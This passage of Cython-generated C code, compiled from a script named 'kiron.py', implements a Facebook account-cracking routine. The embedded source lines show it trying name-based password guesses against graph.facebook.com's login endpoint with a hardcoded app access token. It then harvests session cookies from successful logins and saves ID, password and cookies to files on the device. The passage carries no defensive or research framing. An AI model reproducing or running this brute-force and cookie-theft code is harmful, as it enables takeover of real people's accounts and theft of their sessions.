          __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 552, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_10);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_8;
          __pyx_t_22 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
          __Pyx_GIVEREF(__pyx_t_10);
          PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_10);
          __pyx_t_10 = 0;
          __Pyx_INCREF(__pyx_kp_u__25);
          __pyx_t_22 += 1;
          __Pyx_GIVEREF(__pyx_kp_u__25);
          PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_kp_u__25);
          __pyx_t_10 = __Pyx_PyUnicode_Join(__pyx_t_5, 3, __pyx_t_22, __pyx_t_8); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 552, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_10);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_t_5 = PyNumber_Add(__pyx_t_10, __pyx_v_coki); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 552, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
          __pyx_t_10 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_5); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 552, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_10);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

          /* "kiron.py":553
 *                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
 *                                         print(f"\r\r\x1b[38;5;244m (\x1b[38;5;46m\x1b[38;5;244m)>>{A} "+coki)
 *                                         linex()             # <<<<<<<<<<<<<<
 *                                         open('/sdcard/AYYUB-FILE-M1-OK.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
 *                                         oks.append(ids)
 */
          __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_linex); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 553, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_4 = NULL;
          __pyx_t_13 = 0;
          #if CYTHON_UNPACK_METHODS
          if (unlikely(PyMethod_Check(__pyx_t_5))) {
            __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_5);
            if (likely(__pyx_t_4)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
              __Pyx_INCREF(__pyx_t_4);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_5, function);
              __pyx_t_13 = 1;
            }
          }
          #endif
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_4, NULL};
            __pyx_t_10 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 553, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          }
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

          /* "kiron.py":554
 *                                         print(f"\r\r\x1b[38;5;244m (\x1b[38;5;46m\x1b[38;5;244m)>>{A} "+coki)
 *                                         linex()
 *                                         open('/sdcard/AYYUB-FILE-M1-OK.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")             # <<<<<<<<<<<<<<
 *                                         oks.append(ids)
 *                                         break
 */
          __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__87, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 554, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_write); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 554, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_t_5 = PyNumber_Add(__pyx_v_ids, __pyx_kp_s__32); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 554, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_18 = PyNumber_Add(__pyx_t_5, __pyx_v_pas); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 554, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_18);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_t_5 = PyNumber_Add(__pyx_t_18, __pyx_kp_s__32); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 554, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
          __pyx_t_18 = PyNumber_Add(__pyx_t_5, __pyx_v_coki); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 554, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_18);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_t_5 = PyNumber_Add(__pyx_t_18, __pyx_kp_s__33); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 554, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
          __pyx_t_18 = NULL;
          __pyx_t_13 = 0;
          #if CYTHON_UNPACK_METHODS
          if (likely(PyMethod_Check(__pyx_t_4))) {
            __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_4);
            if (likely(__pyx_t_18)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
              __Pyx_INCREF(__pyx_t_18);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_4, function);
              __pyx_t_13 = 1;
            }
          }
          #endif
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_18, __pyx_t_5};
            __pyx_t_10 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_13, 1+__pyx_t_13);
            __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 554, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          }
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

          /* "kiron.py":555
 *                                         linex()
 *                                         open('/sdcard/AYYUB-FILE-M1-OK.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
 *                                         oks.append(ids)             # <<<<<<<<<<<<<<
 *                                         break
 *                         elif 'www.facebook.com' in po['error']['message']:
 */
          __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_oks); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 555, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_10);
          __pyx_t_24 = __Pyx_PyObject_Append(__pyx_t_10, __pyx_v_ids); if (unlikely(__pyx_t_24 == ((int)-1))) __PYX_ERR(0, 555, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

          /* "kiron.py":556
 *                                         open('/sdcard/AYYUB-FILE-M1-OK.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
 *                                         oks.append(ids)
 *                                         break             # <<<<<<<<<<<<<<
 *                         elif 'www.facebook.com' in po['error']['message']:
 *                                         if 'y' in pcp:
 */
          goto __pyx_L18_break;

          /* "kiron.py":549
 *                         url = 'https://graph.facebook.com/auth/login'
 *                         po = requests.post(url,data=data,headers=headers).json()
 *                         if 'session_key' in po:             # <<<<<<<<<<<<<<
 *                                         print(f'\r\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m '+ids+f' ~\x1b[38;5;244m\x1b[38;5;46m '+pas+'\033[1;97m')
 *                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
 */
        }

        /* "kiron.py":557
 *                                         oks.append(ids)
 *                                         break
 *                         elif 'www.facebook.com' in po['error']['message']:             # <<<<<<<<<<<<<<
 *                                         if 'y' in pcp:
 *                                                 print(f'\r\r\x1b[38;5;244m[{Y}AYYUB-CP\x1b[38;5;244m]{Y} '+ids+' | '+pas+'\033[1;97m')
 */
        __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_v_po, __pyx_n_s_error); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 557, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_10, __pyx_n_s_message); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 557, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __pyx_t_23 = (__Pyx_PySequence_ContainsTF(__pyx_kp_s_www_facebook_com, __pyx_t_4, Py_EQ)); if (unlikely((__pyx_t_23 < 0))) __PYX_ERR(0, 557, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        if (__pyx_t_23) {

          /* "kiron.py":558
 *                                         break
 *                         elif 'www.facebook.com' in po['error']['message']:
 *                                         if 'y' in pcp:             # <<<<<<<<<<<<<<
 *                                                 print(f'\r\r\x1b[38;5;244m[{Y}AYYUB-CP\x1b[38;5;244m]{Y} '+ids+' | '+pas+'\033[1;97m')
 *                                                 open('/sdcard/AYYUB-CP.txt','a').write(ids+'|'+pas+'\n')
 */
          __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_pcp); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 558, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_23 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_y, __pyx_t_4, Py_EQ)); if (unlikely((__pyx_t_23 < 0))) __PYX_ERR(0, 558, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (__pyx_t_23) {

            /* "kiron.py":559
 *                         elif 'www.facebook.com' in po['error']['message']:
 *                                         if 'y' in pcp:
 *                                                 print(f'\r\r\x1b[38;5;244m[{Y}AYYUB-CP\x1b[38;5;244m]{Y} '+ids+' | '+pas+'\033[1;97m')             # <<<<<<<<<<<<<<
 *                                                 open('/sdcard/AYYUB-CP.txt','a').write(ids+'|'+pas+'\n')
 *                                                 cps.append(ids)
 */
            __pyx_t_4 = PyTuple_New(5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 559, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_22 = 0;
            __pyx_t_8 = 127;
            __Pyx_INCREF(__pyx_kp_u_38_5_244m_4);
            __pyx_t_22 += 14;
            __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_4);
            PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_kp_u_38_5_244m_4);
            __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_Y); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 559, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_10, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 559, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_8;
            __pyx_t_22 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
            __Pyx_GIVEREF(__pyx_t_5);
            PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_5);
            __pyx_t_5 = 0;
            __Pyx_INCREF(__pyx_kp_u_AYYUB_CP_38_5_244m);
            __pyx_t_22 += 20;
            __Pyx_GIVEREF(__pyx_kp_u_AYYUB_CP_38_5_244m);
            PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_kp_u_AYYUB_CP_38_5_244m);
            __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_Y); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 559, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 559, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_8;
            __pyx_t_22 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
            __Pyx_GIVEREF(__pyx_t_10);
            PyTuple_SET_ITEM(__pyx_t_4, 3, __pyx_t_10);
            __pyx_t_10 = 0;
            __Pyx_INCREF(__pyx_kp_u__25);
            __pyx_t_22 += 1;
            __Pyx_GIVEREF(__pyx_kp_u__25);
            PyTuple_SET_ITEM(__pyx_t_4, 4, __pyx_kp_u__25);
            __pyx_t_10 = __Pyx_PyUnicode_Join(__pyx_t_4, 5, __pyx_t_22, __pyx_t_8); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 559, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = PyNumber_Add(__pyx_t_10, __pyx_v_ids); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 559, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_10 = PyNumber_Add(__pyx_t_4, __pyx_kp_s__88); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 559, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = PyNumber_Add(__pyx_t_10, __pyx_v_pas); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 559, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_10 = PyNumber_Add(__pyx_t_4, __pyx_kp_s_1_97m); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 559, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 559, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "kiron.py":560
 *                                         if 'y' in pcp:
 *                                                 print(f'\r\r\x1b[38;5;244m[{Y}AYYUB-CP\x1b[38;5;244m]{Y} '+ids+' | '+pas+'\033[1;97m')
 *                                                 open('/sdcard/AYYUB-CP.txt','a').write(ids+'|'+pas+'\n')             # <<<<<<<<<<<<<<
 *                                                 cps.append(ids)
 *                                                 break
 */
            __pyx_t_10 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__89, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 560, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_write); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 560, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_10 = PyNumber_Add(__pyx_v_ids, __pyx_kp_s__32); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 560, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_18 = PyNumber_Add(__pyx_t_10, __pyx_v_pas); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 560, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_10 = PyNumber_Add(__pyx_t_18, __pyx_kp_s__33); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 560, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            __pyx_t_18 = NULL;
            __pyx_t_13 = 0;
            #if CYTHON_UNPACK_METHODS
            if (likely(PyMethod_Check(__pyx_t_5))) {
              __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_5);
              if (likely(__pyx_t_18)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
                __Pyx_INCREF(__pyx_t_18);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_5, function);
                __pyx_t_13 = 1;
              }
            }
            #endif
            {
              PyObject *__pyx_callargs[2] = {__pyx_t_18, __pyx_t_10};
              __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_13, 1+__pyx_t_13);
              __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 560, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            }
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "kiron.py":561
 *                                                 print(f'\r\r\x1b[38;5;244m[{Y}AYYUB-CP\x1b[38;5;244m]{Y} '+ids+' | '+pas+'\033[1;97m')
 *                                                 open('/sdcard/AYYUB-CP.txt','a').write(ids+'|'+pas+'\n')
 *                                                 cps.append(ids)             # <<<<<<<<<<<<<<
 *                                                 break
 *                                         else:
 */
            __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_cps); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 561, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_24 = __Pyx_PyObject_Append(__pyx_t_4, __pyx_v_ids); if (unlikely(__pyx_t_24 == ((int)-1))) __PYX_ERR(0, 561, __pyx_L3_error)
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "kiron.py":562
 *                                                 open('/sdcard/AYYUB-CP.txt','a').write(ids+'|'+pas+'\n')
 *                                                 cps.append(ids)
 *                                                 break             # <<<<<<<<<<<<<<
 *                                         else:
 *                                                 break
 */
            goto __pyx_L18_break;

            /* "kiron.py":558
 *                                         break
 *                         elif 'www.facebook.com' in po['error']['message']:
 *                                         if 'y' in pcp:             # <<<<<<<<<<<<<<
 *                                                 print(f'\r\r\x1b[38;5;244m[{Y}AYYUB-CP\x1b[38;5;244m]{Y} '+ids+' | '+pas+'\033[1;97m')
 *                                                 open('/sdcard/AYYUB-CP.txt','a').write(ids+'|'+pas+'\n')
 */
          }

          /* "kiron.py":564
 *                                                 break
 *                                         else:
 *                                                 break             # <<<<<<<<<<<<<<
 *                         else:
 *                                         continue
 */
          /*else*/ {
            goto __pyx_L18_break;
          }

          /* "kiron.py":557
 *                                         oks.append(ids)
 *                                         break
 *                         elif 'www.facebook.com' in po['error']['message']:             # <<<<<<<<<<<<<<
 *                                         if 'y' in pcp:
 *                                                 print(f'\r\r\x1b[38;5;244m[{Y}AYYUB-CP\x1b[38;5;244m]{Y} '+ids+' | '+pas+'\033[1;97m')
 */
        }

        /* "kiron.py":566
 *                                                 break
 *                         else:
 *                                         continue             # <<<<<<<<<<<<<<
 *                 loop+=1
 *         except requests.exceptions.ConnectionError:
 */
        /*else*/ {
          goto __pyx_L17_continue;
        }

        /* "kiron.py":476
 *                 except:
 *                         ln = fn
 *                 for pw in passlist:             # <<<<<<<<<<<<<<
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 */
        __pyx_L17_continue:;
      }
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      goto __pyx_L21_for_end;
      __pyx_L18_break:;
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      goto __pyx_L21_for_end;
      __pyx_L21_for_end:;

      /* "kiron.py":567
 *                         else:
 *                                         continue
 *                 loop+=1             # <<<<<<<<<<<<<<
 *         except requests.exceptions.ConnectionError:
 *                 time.sleep(10)
 */
      __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_loop); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 567, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __pyx_t_4 = __Pyx_PyInt_AddObjC(__pyx_t_11, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 567, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_loop, __pyx_t_4) < 0) __PYX_ERR(0, 567, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      /* "kiron.py":468
 * #__________________| FILE METHOD M1 |__________________#
 * def api1(ids,names,passlist):
 *         try:             # <<<<<<<<<<<<<<
 *                 global oks,loop,sim_id,device
 *                 sys.stdout.write(f'\r\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m|\x1b[1;91m%s\x1b[38;5;244m] '%(loop,len(oks),len(cps)));sys.stdout.flush()
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
    __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
    __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
    __Pyx_XDECREF(__pyx_t_20); __pyx_t_20 = 0;
    __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "kiron.py":568
 *                                         continue
 *                 loop+=1
 *         except requests.exceptions.ConnectionError:             # <<<<<<<<<<<<<<
 *                 time.sleep(10)
 * #__________________| FILE METHOD M2 |__________________#
 */
    __Pyx_ErrFetch(&__pyx_t_4, &__pyx_t_11, &__pyx_t_5);
    __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_requests); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 568, __pyx_L5_except_error)
    __Pyx_GOTREF(__pyx_t_10);
    __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_exceptions); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 568, __pyx_L5_except_error)
    __Pyx_GOTREF(__pyx_t_18);
    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
    __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_ConnectionError); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 568, __pyx_L5_except_error)
    __Pyx_GOTREF(__pyx_t_10);
    __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
    __pyx_t_13 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_4, __pyx_t_10);
    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_ErrRestore(__pyx_t_4, __pyx_t_11, __pyx_t_5);
    __pyx_t_4 = 0; __pyx_t_11 = 0; __pyx_t_5 = 0;
    if (__pyx_t_13) {
      __Pyx_AddTraceback("kiron.api1", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_11, &__pyx_t_4) < 0) __PYX_ERR(0, 568, __pyx_L5_except_error)
      __Pyx_XGOTREF(__pyx_t_5);
      __Pyx_XGOTREF(__pyx_t_11);
      __Pyx_XGOTREF(__pyx_t_4);

      /* "kiron.py":569
 *                 loop+=1
 *         except requests.exceptions.ConnectionError:
 *                 time.sleep(10)             # <<<<<<<<<<<<<<
 * #__________________| FILE METHOD M2 |__________________#
 * def api2(ids,names,passlist):
 */
      __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_time); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 569, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_18);
      __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_sleep); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 569, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
      __pyx_t_18 = NULL;
      __pyx_t_13 = 0;
      #if CYTHON_UNPACK_METHODS
      if (unlikely(PyMethod_Check(__pyx_t_12))) {
        __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_12);
        if (likely(__pyx_t_18)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
          __Pyx_INCREF(__pyx_t_18);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_12, function);
          __pyx_t_13 = 1;
        }
      }
      #endif
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_18, __pyx_int_10};
        __pyx_t_10 = __Pyx_PyObject_FastCall(__pyx_t_12, __pyx_callargs+1-__pyx_t_13, 1+__pyx_t_13);
        __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
        if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 569, __pyx_L5_except_error)
        __Pyx_GOTREF(__pyx_t_10);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      }
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;

    /* "kiron.py":468
 * #__________________| FILE METHOD M1 |__________________#
 * def api1(ids,names,passlist):
 *         try:             # <<<<<<<<<<<<<<
 *                 global oks,loop,sim_id,device
 *                 sys.stdout.write(f'\r\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m|\x1b[1;91m%s\x1b[38;5;244m] '%(loop,len(oks),len(cps)));sys.stdout.flush()
 */
    __pyx_L5_except_error:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  /* "kiron.py":467
 *             time.sleep(10)
 * #__________________| FILE METHOD M1 |__________________#
 * def api1(ids,names,passlist):             # <<<<<<<<<<<<<<
 *         try:
 *                 global oks,loop,sim_id,device
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_9);
